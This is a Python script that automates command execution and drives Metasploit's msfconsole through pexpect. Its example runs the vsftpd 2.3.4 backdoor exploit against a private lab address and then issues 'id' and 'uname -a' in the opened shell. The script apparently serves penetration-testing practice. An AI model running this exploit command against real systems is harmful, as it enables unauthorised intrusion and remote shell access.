import subprocess
from datetime import datetime
import pexpect
import sys
import time
import re

def execute_command(command, timeout=30, user_input=None, follow_up_commands=None):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    is_msfconsole = "msfconsole" in command.split()
    filename = f"command_results_{timestamp}.txt"
    shell_detected = False

    try:
        if is_msfconsole:
            # Special handling for msfconsole using pexpect
            print("Executing msfconsole command. Please wait...")
            child = pexpect.spawn(command, encoding='utf8', timeout=timeout)
            child.logfile = sys.stdout

            prompt_pattern = r'msf[0-9]* >\s*$'
            child.expect(prompt_pattern, timeout=30)
            print("\nmsfconsole prompt detected.")

            if user_input:
                child.sendline(user_input)
                child.expect(prompt_pattern, timeout=timeout)
                print(f"\nExecuted command: {user_input}. Output above.")

            if follow_up_commands:
                for cmd in follow_up_commands:
                    child.sendline(cmd)
                    child.expect(prompt_pattern, timeout=timeout)
                    print(f"\nExecuted command: {cmd}. Output above.")

            child.sendline('exit')
            child.expect(pexpect.EOF)

        else:
            # Handling for other commands using subprocess
            print(f"Executing command: {command}")
            with open(filename, 'w', encoding='utf-8') as f:
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, universal_newlines=True)

                if user_input:
                    process.stdin.write(user_input + "\n")
                    process.stdin.flush()

                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    print(line, end='')
                    f.write(line)
                    f.flush()

                process.wait(timeout=timeout)
                print(f"\nExecuted command: {command}. Output logged to {filename}.")

    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e.output}")
    except Exception as e:
        print(f"Unexpected error: {e}")

    return filename, shell_detected

# Example usage
if __name__ == "__main__":
    test_command = 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.18.129; set RPORT 21; exploit"'
    follow_up_commands = ['id\n', 'uname -a']
    _, shell_detected = execute_command(test_command, user_input='uname -a\n', follow_up_commands=follow_up_commands)